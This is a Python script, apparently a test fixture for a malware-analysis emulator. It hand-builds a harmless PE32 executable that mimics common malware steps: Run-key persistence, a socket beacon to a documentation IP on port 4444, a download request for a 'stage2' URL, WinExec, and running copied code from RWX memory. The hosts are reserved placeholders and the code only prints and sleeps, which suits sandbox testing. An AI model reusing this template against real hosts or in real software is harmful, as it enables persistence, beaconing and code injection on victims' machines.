"""Build a small, benign PE32 test program that exercises the behaviours rebox reports.

The program is assembled from hand-encoded x86 instructions. It never runs
natively: the tests only hand it to the emulator. Behaviour, in order:
OutputDebugStringA(GetCommandLineA()), IsDebuggerPresent, CreateMutexA, CreateFileA/WriteFile, RegCreateKeyExA/RegSetValueExA,
WSAStartup/gethostbyname/socket/connect/send to a TEST-NET address, InternetOpenA/
InternetOpenUrlA, WinExec, then VirtualAlloc(RWX), copy a stub into it and call it
(the stub calls Sleep and OutputDebugStringA), then ExitProcess.
All hosts and addresses are reserved documentation ranges (.invalid, 198.51.100.0/24).
"""

from __future__ import annotations

import struct

BASE = 0x400000
TEXT_RVA, DATA_RVA, IDATA_RVA = 0x1000, 0x2000, 0x3000

IMPORTS = {
    "kernel32.dll": ["IsDebuggerPresent", "CreateMutexA", "CreateFileA", "WriteFile", "CloseHandle", "WinExec",
                     "VirtualAlloc", "Sleep", "OutputDebugStringA", "ExitProcess", "GetCommandLineA"],
    "advapi32.dll": ["RegCreateKeyExA", "RegSetValueExA"],
    "ws2_32.dll": ["WSAStartup", "gethostbyname", "socket", "connect", "send"],
    "wininet.dll": ["InternetOpenA", "InternetOpenUrlA"],
}

EXPECT = {
    "mutex": "Global\\rebox-test-mutex",
    "file": "C:\\Users\\Public\\rebox_drop.txt",
    "file_content": b"rebox test payload\r\n",
    "runkey": "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
    "value": "ReboxTest",
    "value_data": "C:\\Users\\Public\\rebox_drop.exe",
    "host": "beacon.rebox-test.invalid",
    "ip": "198.51.100.7",
    "port": 4444,
    "url": "http://dl.rebox-test.invalid/stage2.bin",
    "agent": "rebox-test-agent/1.0",
    "cmd": "cmd.exe /c echo rebox-test",
    "stage2_msg": "rebox stage2 running",
}


def _imports():
    """Return (idata bytes, {name: IAT absolute address}, dir size)."""
    dlls = list(IMPORTS.items())
    desc_size = 20 * (len(dlls) + 1)
    off = desc_size
    layout = []
    for dll, names in dlls:
        ilt = off
        off += 4 * (len(names) + 1)
        iat = off
        off += 4 * (len(names) + 1)
        layout.append((dll, names, ilt, iat))
    blobs, hint, dllname = [], {}, {}
    for dll, names, _, _ in layout:
        for n in names:
            b = b"\0\0" + n.encode() + b"\0"
            b += b"\0" * (len(b) & 1)
            hint[n] = off
            blobs.append((off, b))
            off += len(b)
        b = dll.encode() + b"\0"
        dllname[dll] = off
        blobs.append((off, b))
        off += len(b)
    buf = bytearray(off)
    iat_abs = {}
    for i, (dll, names, ilt, iat) in enumerate(layout):
        struct.pack_into("<5I", buf, i * 20, IDATA_RVA + ilt, 0, 0, IDATA_RVA + dllname[dll], IDATA_RVA + iat)
        for j, n in enumerate(names):
            for table in (ilt, iat):
                struct.pack_into("<I", buf, table + 4 * j, IDATA_RVA + hint[n])
            iat_abs[n] = BASE + IDATA_RVA + iat + 4 * j
    for o, b in blobs:
        buf[o:o + len(b)] = b
    return bytes(buf), iat_abs, desc_size


class Data:
    def __init__(self):
        self.buf = bytearray()

    def add(self, b: bytes, align=4) -> int:
        while len(self.buf) % align:
            self.buf.append(0)
        addr = BASE + DATA_RVA + len(self.buf)
        self.buf += b
        return addr

    def s(self, text: str) -> int:
        return self.add(text.encode() + b"\0")


def _push(arg) -> bytes:
    regs = {"eax": 0x50, "ebx": 0x53, "ebp": 0x55, "esi": 0x56, "edi": 0x57}
    if isinstance(arg, str):
        return bytes([regs[arg]])
    if isinstance(arg, tuple):  # ("mem", addr): push dword [addr]
        return b"\xff\x35" + struct.pack("<I", arg[1])
    return b"\x68" + struct.pack("<I", arg & 0xFFFFFFFF)


def build() -> bytes:
    idata, iat, import_dir_size = _imports()
    d = Data()
    code = bytearray()

    def call(api, *args):
        for a in reversed(args):
            code.extend(_push(a))
        code.extend(b"\xff\x15" + struct.pack("<I", iat[api]))

    s_mutex = d.s(EXPECT["mutex"])
    s_file = d.s(EXPECT["file"])
    s_content = d.add(EXPECT["file_content"])
    written = d.add(b"\0" * 4)
    s_runkey = d.s(EXPECT["runkey"])
    s_value = d.s(EXPECT["value"])
    s_vdata = d.s(EXPECT["value_data"])
    hkey = d.add(b"\0" * 4)
    wsadata = d.add(b"\0" * 400)
    s_host = d.s(EXPECT["host"])
    a, b, c, e = (int(x) for x in EXPECT["ip"].split("."))
    sockaddr = d.add(struct.pack("<H", 2) + struct.pack(">H", EXPECT["port"]) + bytes([a, b, c, e]) + b"\0" * 8)
    s_beacon = d.s("HELLO rebox-test")
    s_agent = d.s(EXPECT["agent"])
    s_url = d.s(EXPECT["url"])
    s_cmd = d.s(EXPECT["cmd"])
    s_stage2 = d.s(EXPECT["stage2_msg"])
    stub = (b"\x6a\x01" + b"\xff\x15" + struct.pack("<I", iat["Sleep"])
            + b"\x68" + struct.pack("<I", s_stage2) + b"\xff\x15" + struct.pack("<I", iat["OutputDebugStringA"])
            + b"\xb8\x37\x13\x00\x00" + b"\xc3")
    s_stub = d.add(stub)

    call("GetCommandLineA")
    code.extend(b"\x50")  # push eax
    code.extend(b"\xff\x15" + struct.pack("<I", iat["OutputDebugStringA"]))
    call("IsDebuggerPresent")
    call("CreateMutexA", 0, 0, s_mutex)
    call("CreateFileA", s_file, 0x40000000, 0, 0, 2, 0x80, 0)
    code.extend(b"\x89\xc5")  # mov ebp, eax
    call("WriteFile", "ebp", s_content, len(EXPECT["file_content"]), written, 0)
    call("CloseHandle", "ebp")
    call("RegCreateKeyExA", 0x80000001, s_runkey, 0, 0, 0, 0x20006, 0, hkey, 0)
    call("RegSetValueExA", ("mem", hkey), s_value, 0, 1, s_vdata, len(EXPECT["value_data"]) + 1)
    call("WSAStartup", 0x202, wsadata)
    call("gethostbyname", s_host)
    call("socket", 2, 1, 6)
    code.extend(b"\x89\xc6")  # mov esi, eax
    call("connect", "esi", sockaddr, 16)
    call("send", "esi", s_beacon, 16, 0)
    call("InternetOpenA", s_agent, 0, 0, 0, 0)
    code.extend(b"\x89\xc7")  # mov edi, eax
    call("InternetOpenUrlA", "edi", s_url, 0, 0, 0, 0)
    call("WinExec", s_cmd, 0)
    call("VirtualAlloc", 0, 0x1000, 0x3000, 0x40)
    code.extend(b"\x89\xc3\x89\xc7")  # mov ebx, eax ; mov edi, eax
    code.extend(b"\xbe" + struct.pack("<I", s_stub))  # mov esi, stub
    code.extend(b"\xb9" + struct.pack("<I", len(stub)))  # mov ecx, len
    code.extend(b"\xf3\xa4")  # rep movsb
    code.extend(b"\xff\xd3")  # call ebx
    call("ExitProcess", 0)
    code.extend(b"\xc3")

    return _assemble(bytes(code), bytes(d.buf), idata, iat, import_dir_size)


def build_loop() -> bytes:
    """A program that calls Sleep(0) forever: exercises the timeout path."""
    idata, iat, import_dir_size = _imports()
    code = b"\x6a\x00" + b"\xff\x15" + struct.pack("<I", iat["Sleep"]) + b"\xeb\xf6"  # push 0; call [Sleep]; jmp -10
    return _assemble(code, b"\0" * 4, idata, iat, import_dir_size)


def _assemble(text, data, idata, iat, import_dir_size) -> bytes:
    sections = [(b".text", TEXT_RVA, text, 0x60000020), (b".data", DATA_RVA, data, 0xC0000040),
                (b".idata", IDATA_RVA, idata, 0xC0000040)]
    assert all(len(c) <= 0x1000 for _, _, c, _ in sections)
    hdr = bytearray(0x400)
    hdr[0:2] = b"MZ"
    struct.pack_into("<I", hdr, 0x3C, 0x80)
    hdr[0x80:0x84] = b"PE\0\0"
    struct.pack_into("<HHIIIHH", hdr, 0x84, 0x14C, len(sections), 0x5F5E1000, 0, 0, 224, 0x0103)
    opt = 0x98
    struct.pack_into("<HBBIIIIIIIIIHHHHHHIIIIHHIIIIII", hdr, opt,
                     0x10B, 14, 0, 0x200, 0x400, 0, TEXT_RVA, TEXT_RVA, DATA_RVA, BASE, 0x1000, 0x200,
                     6, 0, 0, 0, 6, 0, 0, 0x4000, 0x400, 0, 3, 0,
                     0x100000, 0x1000, 0x100000, 0x1000, 0, 16)
    dirs = opt + 96
    iat_lo = min(iat.values()) - BASE
    struct.pack_into("<II", hdr, dirs + 1 * 8, IDATA_RVA, import_dir_size)
    struct.pack_into("<II", hdr, dirs + 12 * 8, iat_lo, max(iat.values()) - BASE + 4 - iat_lo)
    sh = opt + 224
    raw = 0x400
    body = bytearray()
    for i, (name, rva, content, chars) in enumerate(sections):
        rsize = (len(content) + 0x1FF) & ~0x1FF
        struct.pack_into("<8sIIIIIIHHI", hdr, sh + 40 * i, name, len(content), rva, rsize, raw + len(body),
                         0, 0, 0, 0, chars)
        body += content + b"\0" * (rsize - len(content))
    return bytes(hdr) + bytes(body)


if __name__ == "__main__":
    import sys

    with open(sys.argv[1], "wb") as f:  # data file only; mode stays non-executable
        f.write(build_loop() if len(sys.argv) > 2 and sys.argv[2] == "loop" else build())
